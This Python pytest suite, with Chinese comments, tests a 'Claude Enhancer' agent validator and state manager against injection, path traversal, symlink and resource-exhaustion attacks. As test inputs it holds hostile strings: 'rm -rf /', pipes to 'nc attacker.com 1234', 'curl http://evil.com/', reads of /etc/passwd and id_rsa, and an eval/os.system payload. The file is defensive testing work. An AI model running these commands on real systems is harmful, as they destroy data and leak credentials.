#!/usr/bin/env python3
"""
Claude Enhancer 安全验证测试套件
测试系统的安全性和防护措施
"""

import pytest
import json
import tempfile
import os
import sys
import subprocess
import stat
from unittest.mock import patch, mock_open
from pathlib import Path

# 添加项目根目录到 Python 路径
project_root = Path(__file__).parent.parent.parent.parent
sys.path.insert(0, str(project_root / ".claude/hooks"))

try:
    from phase_manager import PhaseManager, ExecutionPhase, get_phase_manager
except ImportError as e:
    pytest.skip(f"Cannot import phase_manager: {e}", allow_module_level=True)


class TestInputValidation:
    """输入验证安全测试"""

    def setup_method(self):
        """测试设置"""
        self.temp_dir = tempfile.mkdtemp()
        self.validator_script = project_root / ".claude/hooks/agent_validator.sh"

    def teardown_method(self):
        """清理测试环境"""
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_malicious_json_injection(self):
        """测试恶意JSON注入攻击"""
        malicious_inputs = [
            # JSON注入尝试
            '{"function_calls": [{"invoke": "$(rm -rf /)", "parameters": {}}]}',

            # 命令注入尝试
            '{"function_calls": [{"invoke": "Task", "parameters": {"subagent_type": "test; rm -rf /tmp", "prompt": "test"}}]}',

            # 路径遍历攻击
            '{"function_calls": [{"invoke": "Task", "parameters": {"subagent_type": "../../../etc/passwd", "prompt": "test"}}]}',

            # 特殊字符注入
            '{"function_calls": [{"invoke": "Task", "parameters": {"subagent_type": "test`whoami`", "prompt": "test"}}]}',

            # 长度攻击（缓冲区溢出尝试）
            '{"function_calls": [{"invoke": "Task", "parameters": {"subagent_type": "' + "A" * 10000 + '", "prompt": "test"}}]}',
        ]

        if not self.validator_script.exists():
            pytest.skip("Agent validator script not found")

        for malicious_input in malicious_inputs:
            result = self._run_validator_safely(malicious_input)

            # 验证脚本没有被恶意输入破坏
            assert result is not None, "Script crashed or timed out"
            assert result.returncode in [0, 1], f"Unexpected return code for malicious input: {result.returncode}"

            # 验证没有执行恶意命令
            assert "rm -rf" not in result.stdout
            assert "rm -rf" not in result.stderr

    def test_script_injection_prevention(self):
        """测试脚本注入防护"""
        script_injection_attempts = [
            # Bash命令注入
            '{"function_calls": [{"invoke": "Task", "parameters": {"prompt": "test && cat /etc/passwd"}}]}',

            # 环境变量注入
            '{"function_calls": [{"invoke": "Task", "parameters": {"prompt": "test", "subagent_type": "${HOME}/malicious"}}]}',

            # 管道命令注入
            '{"function_calls": [{"invoke": "Task", "parameters": {"prompt": "test | nc attacker.com 1234"}}]}',

            # 后台命令执行
            '{"function_calls": [{"invoke": "Task", "parameters": {"prompt": "test & curl http://evil.com/"}}]}',
        ]

        if not self.validator_script.exists():
            pytest.skip("Agent validator script not found")

        for injection_attempt in script_injection_attempts:
            result = self._run_validator_safely(injection_attempt)

            # 验证脚本安全执行
            assert result is not None
            assert result.returncode in [0, 1]

            # 验证没有网络请求或文件访问
            assert "curl" not in result.stdout
            assert "nc" not in result.stdout
            assert "/etc/passwd" not in result.stdout

    def test_path_traversal_prevention(self):
        """测试路径遍历攻击防护"""
        path_traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "/etc/shadow",
            "../../../../root/.ssh/id_rsa",
            "file:///etc/passwd",
            "\\\\..\\\\..\\\\windows\\\\system32",
        ]

        state_file = os.path.join(self.temp_dir, "security_test.json")

        with patch.object(PhaseManager, 'state_file', state_file):
            manager = get_phase_manager()

            for malicious_path in path_traversal_attempts:
                # 尝试通过各种方式注入恶意路径
                try:
                    # 测试状态文件路径操作
                    manager.state_file = malicious_path
                    manager.save_state()

                    # 验证没有在系统目录创建文件
                    assert not os.path.exists("/etc/passwd.json")
                    assert not os.path.exists("/root/.ssh/id_rsa.json")

                except Exception:
                    # 期望的行为：路径验证应该失败
                    pass

    def test_large_input_dos_prevention(self):
        """测试大输入拒绝服务攻击防护"""
        # 创建极大的输入
        large_task_input = {
            "function_calls": [
                {
                    "invoke": "Task",
                    "parameters": {
                        "subagent_type": f"agent-{i}",
                        "prompt": "A" * 10000  # 每个prompt 10KB
                    }
                } for i in range(1000)  # 1000个agents，总计约10MB
            ]
        }

        large_input_json = json.dumps(large_task_input)

        if not self.validator_script.exists():
            pytest.skip("Agent validator script not found")

        # 测试脚本是否能处理大输入而不崩溃
        result = self._run_validator_safely(large_input_json, timeout=30)

        # 验证脚本没有崩溃
        assert result is not None, "Script should handle large input gracefully"
        assert result.returncode in [0, 1], "Script should return valid exit code"

    def _run_validator_safely(self, test_input, timeout=10):
        """安全地运行验证器脚本"""
        try:
            result = subprocess.run(
                [str(self.validator_script)],
                input=test_input,
                text=True,
                capture_output=True,
                timeout=timeout,
                cwd=self.temp_dir  # 在安全目录中运行
            )
            return result
        except subprocess.TimeoutExpired:
            return None
        except Exception:
            return None


class TestFileSystemSecurity:
    """文件系统安全测试"""

    def setup_method(self):
        """测试设置"""
        self.temp_dir = tempfile.mkdtemp()

    def teardown_method(self):
        """清理测试环境"""
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_secure_file_permissions(self):
        """测试安全文件权限"""
        state_file = os.path.join(self.temp_dir, "permissions_test.json")

        with patch.object(PhaseManager, 'state_file', state_file):
            manager = get_phase_manager()
            manager.reset_phases()

            # 保存状态以创建文件
            manager.save_state()

            # 验证文件权限
            file_stat = os.stat(state_file)
            file_permissions = stat.filemode(file_stat.st_mode)

            # 状态文件应该只有所有者可读写
            assert file_stat.st_mode & stat.S_IROTH == 0, "State file should not be world-readable"
            assert file_stat.st_mode & stat.S_IWOTH == 0, "State file should not be world-writable"
            assert file_stat.st_mode & stat.S_IXOTH == 0, "State file should not be world-executable"

    def test_secure_temporary_files(self):
        """测试临时文件安全性"""
        # 创建临时状态文件
        with tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.json') as tmp_file:
            temp_state_file = tmp_file.name

        try:
            with patch.object(PhaseManager, 'state_file', temp_state_file):
                manager = get_phase_manager()
                manager.reset_phases()

                # 保存敏感信息
                sensitive_result = {
                    "api_key": "secret_key_12345",
                    "database_password": "super_secret_password",
                    "jwt_secret": "jwt_signing_secret"
                }
                manager.advance_to_next_phase()
                manager.save_phase_results(ExecutionPhase.ANALYSIS, sensitive_result)

                # 验证临时文件权限
                file_stat = os.stat(temp_state_file)
                assert file_stat.st_mode & stat.S_IROTH == 0, "Temp file should not be world-readable"
                assert file_stat.st_mode & stat.S_IWOTH == 0, "Temp file should not be world-writable"

        finally:
            # 安全删除临时文件
            if os.path.exists(temp_state_file):
                os.unlink(temp_state_file)

    def test_directory_traversal_prevention(self):
        """测试目录遍历防护"""
        # 尝试在系统目录创建状态文件
        malicious_paths = [
            "/etc/claude_state.json",
            "/root/claude_state.json",
            "/var/www/html/claude_state.json",
            "../../../etc/claude_state.json"
        ]

        for malicious_path in malicious_paths:
            try:
                with patch.object(PhaseManager, 'state_file', malicious_path):
                    manager = get_phase_manager()
                    manager.save_state()

                # 验证没有在系统目录创建文件
                assert not os.path.exists(malicious_path), f"Should not create file at {malicious_path}"

            except (PermissionError, OSError):
                # 期望的行为：应该因权限不足而失败
                pass

    def test_symlink_attack_prevention(self):
        """测试符号链接攻击防护"""
        # 创建指向系统文件的符号链接
        symlink_target = "/etc/passwd"
        symlink_path = os.path.join(self.temp_dir, "malicious_symlink.json")

        try:
            os.symlink(symlink_target, symlink_path)

            with patch.object(PhaseManager, 'state_file', symlink_path):
                manager = get_phase_manager()

                # 尝试保存状态（应该被阻止或安全处理）
                try:
                    manager.save_state()
                except Exception:
                    # 期望的行为：应该检测到符号链接并拒绝
                    pass

                # 验证系统文件没有被修改
                with open(symlink_target, 'r') as f:
                    content = f.read()
                    assert "current_phase" not in content, "System file should not be modified"

        except OSError:
            # 在某些系统上可能无法创建符号链接
            pytest.skip("Cannot create symlink for testing")


class TestConfigurationSecurity:
    """配置安全测试"""

    def setup_method(self):
        """测试设置"""
        self.temp_dir = tempfile.mkdtemp()
        self.config_file = project_root / ".claude/hooks/config.yaml"

    def teardown_method(self):
        """清理测试环境"""
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_config_file_security(self):
        """测试配置文件安全性"""
        if not self.config_file.exists():
            pytest.skip("Config file not found")

        # 验证配置文件权限
        file_stat = os.stat(self.config_file)

        # 配置文件不应该对其他用户可写
        assert file_stat.st_mode & stat.S_IWOTH == 0, "Config file should not be world-writable"

        # 读取配置内容检查敏感信息
        with open(self.config_file, 'r') as f:
            config_content = f.read().lower()

        # 配置文件不应该包含明文密码
        sensitive_patterns = [
            "password",
            "secret",
            "key",
            "token",
            "credential"
        ]

        for pattern in sensitive_patterns:
            if pattern in config_content:
                # 如果包含敏感关键词，检查是否是安全的引用
                lines = config_content.split('\n')
                for line in lines:
                    if pattern in line and not line.strip().startswith('#'):
                        # 确保不是明文密码
                        assert not any(char.isdigit() for char in line), f"Potential sensitive data in config: {line}"

    def test_environment_variable_security(self):
        """测试环境变量安全性"""
        # 测试敏感环境变量是否安全处理
        sensitive_env_vars = {
            "CLAUDE_ENHANCER_SECRET": "test_secret_123",
            "DATABASE_PASSWORD": "db_password_456",
            "JWT_SECRET": "jwt_secret_789"
        }

        original_env = {}
        try:
            # 设置测试环境变量
            for key, value in sensitive_env_vars.items():
                original_env[key] = os.environ.get(key)
                os.environ[key] = value

            # 验证系统不会意外泄露环境变量
            state_file = os.path.join(self.temp_dir, "env_test.json")

            with patch.object(PhaseManager, 'state_file', state_file):
                manager = get_phase_manager()
                manager.reset_phases()

                # 创建包含可能引用环境变量的结果
                result = {
                    "config": "loaded from environment",
                    "status": "configured"
                }
                manager.advance_to_next_phase()
                manager.save_phase_results(ExecutionPhase.ANALYSIS, result)

                # 读取保存的状态文件
                with open(state_file, 'r') as f:
                    state_content = f.read()

                # 验证敏感值没有被意外保存
                for env_value in sensitive_env_vars.values():
                    assert env_value not in state_content, f"Sensitive environment variable value found in state: {env_value}"

        finally:
            # 恢复原始环境变量
            for key, original_value in original_env.items():
                if original_value is None:
                    os.environ.pop(key, None)
                else:
                    os.environ[key] = original_value

    def test_log_sanitization(self):
        """测试日志信息清理"""
        # 模拟包含敏感信息的操作
        sensitive_data = {
            "password": "user_password_123",
            "api_key": "sk-1234567890abcdef",
            "credit_card": "4111-1111-1111-1111",
            "ssn": "123-45-6789"
        }

        state_file = os.path.join(self.temp_dir, "log_test.json")

        with patch.object(PhaseManager, 'state_file', state_file):
            manager = get_phase_manager()
            manager.reset_phases()

            # 保存包含敏感信息的结果
            result = {
                "user_input": f"My password is {sensitive_data['password']}",
                "api_response": f"API key: {sensitive_data['api_key']}",
                "payment_info": f"Card: {sensitive_data['credit_card']}"
            }

            manager.advance_to_next_phase()
            manager.save_phase_results(ExecutionPhase.ANALYSIS, result)

            # 检查状态文件是否包含敏感信息
            with open(state_file, 'r') as f:
                state_content = f.read()

            # 注意：这个测试假设系统应该清理敏感信息
            # 在实际实现中，可能需要添加敏感信息清理功能
            for sensitive_value in sensitive_data.values():
                if sensitive_value in state_content:
                    # 如果发现敏感信息，记录警告
                    print(f"Warning: Sensitive data found in state file: {sensitive_value}")


class TestAccessControl:
    """访问控制测试"""

    def setup_method(self):
        """测试设置"""
        self.temp_dir = tempfile.mkdtemp()

    def teardown_method(self):
        """清理测试环境"""
        import shutil
        shutil.rmtree(self.temp_dir, ignore_errors=True)

    def test_unauthorized_file_access(self):
        """测试未授权文件访问防护"""
        # 创建受保护的目录
        protected_dir = os.path.join(self.temp_dir, "protected")
        os.makedirs(protected_dir, mode=0o700)  # 只有所有者可访问

        protected_file = os.path.join(protected_dir, "sensitive.json")
        with open(protected_file, 'w') as f:
            json.dump({"secret": "confidential_data"}, f)

        # 尝试通过PhaseManager访问受保护文件
        with patch.object(PhaseManager, 'state_file', protected_file):
            try:
                manager = get_phase_manager()
                manager.save_state()

                # 如果成功访问，验证是在正确的上下文中
                assert os.path.exists(protected_file)

            except PermissionError:
                # 期望的行为：应该被访问控制阻止
                pass

    def test_process_isolation(self):
        """测试进程隔离"""
        # 验证PhaseManager不能执行系统命令
        state_file = os.path.join(self.temp_dir, "isolation_test.json")

        with patch.object(PhaseManager, 'state_file', state_file):
            manager = get_phase_manager()

            # 尝试通过各种方式执行系统命令
            malicious_results = [
                {"command": "os.system('ls -la')"},
                {"eval": "eval('__import__(\"os\").system(\"whoami\")')"},
                {"subprocess": "subprocess.run(['cat', '/etc/passwd'])"}
            ]

            for malicious_result in malicious_results:
                try:
                    manager.advance_to_next_phase()
                    manager.save_phase_results(ExecutionPhase.ANALYSIS, malicious_result)

                    # 验证没有执行系统命令
                    # 这需要通过监控系统调用或检查输出来验证
                    pass

                except Exception:
                    # 如果有安全机制阻止，这是期望的行为
                    pass

    def test_resource_limits(self):
        """测试资源限制"""
        state_file = os.path.join(self.temp_dir, "resource_test.json")

        with patch.object(PhaseManager, 'state_file', state_file):
            manager = get_phase_manager()

            # 尝试创建大量数据消耗资源
            try:
                large_data = {
                    "massive_array": [i for i in range(1000000)],  # 1M integers
                    "massive_string": "A" * 10000000  # 10MB string
                }

                manager.advance_to_next_phase()
                manager.save_phase_results(ExecutionPhase.ANALYSIS, large_data)

                # 验证系统能处理大数据而不崩溃
                assert os.path.exists(state_file)

                # 检查文件大小是否合理
                file_size = os.path.getsize(state_file)
                assert file_size < 100 * 1024 * 1024, f"State file too large: {file_size} bytes"

            except MemoryError:
                # 系统资源限制正常工作
                pass


if __name__ == "__main__":
    pytest.main([__file__, "-v"])